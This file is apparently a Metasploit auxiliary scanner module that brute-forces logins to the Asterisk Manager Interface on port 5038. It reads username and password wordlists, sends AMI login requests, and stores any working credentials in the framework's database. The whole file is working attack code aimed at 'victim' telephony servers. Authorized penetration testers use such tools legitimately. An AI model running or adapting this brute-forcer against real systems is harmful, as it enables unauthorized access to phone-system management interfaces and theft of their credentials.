##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Asterisk Manager Login Utility',
      'Description'    => %q{
        This module attempts to authenticate to an Asterisk Manager service. Please note
        that by default, Asterisk Call Management (port 5038) only listens locally, but
        this can be manually configured in file /etc/asterisk/manager.conf by the admin
        on the victim machine.
      },
      'Author'         =>
        [
          'dflah_ <dflah[at]alligatorteam.org>',
        ],
      'References'     =>
        [
          ['URL', 'http://www.asterisk.org/astdocs/node201.html'], # Docs for AMI
        ],
      'License'     => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(5038),
        OptString.new('USER_FILE',
          [
            false,
            'The file that contains a list of probable users accounts.',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')
          ]),

        OptString.new('PASS_FILE',
          [
            false,
            'The file that contains a list of probable passwords.',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
          ])
      ])
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'asterisk_manager',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run_host(ip)
    print_status("Initializing module...")
    begin
      each_user_pass do |user, pass|
        do_login(user, pass)
      end
    rescue ::Rex::ConnectionError
    rescue ::Exception => e
      vprint_error("#{rhost}:#{rport} #{e.to_s} #{e.backtrace}")
    end
  end

  def send_manager(command='')
    begin
      @result = ''
      if (!@connected)
        connect
        @connected = true
        select(nil,nil,nil,0.4)
      end
      sock.put(command)
      @result = sock.get_once || ''
    rescue ::Exception => err
      print_error("Error: #{err.to_s}")
    end
  end

  def do_login(user='',pass='')
    @connected = false
    begin
      send_manager(nil) # connect Only
      if @result !~ /^Asterisk Call Manager(.*)/
        print_error("Asterisk Manager does not appear to be running")
        return :abort
      else
        vprint_status("#{rhost}:#{rport} - Trying user:'#{user}' with password:'#{pass}'")
        cmd = "Action: Login\r\nUsername: #{user}\r\nSecret: #{pass}\r\n\r\n"
        send_manager(cmd)
        if /Response: Success/.match(@result)
          print_good("User: \"#{user}\" using pass: \"#{pass}\" - can login on #{rhost}:#{rport}!")
          report_cred(ip: rhost, port: rport, user: user, password: pass, proof: @result)
          disconnect
          return :next_user
        else
          disconnect
          return :fail
        end
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue ::Timeout::Error, ::Errno::EPIPE
    end
  end
end
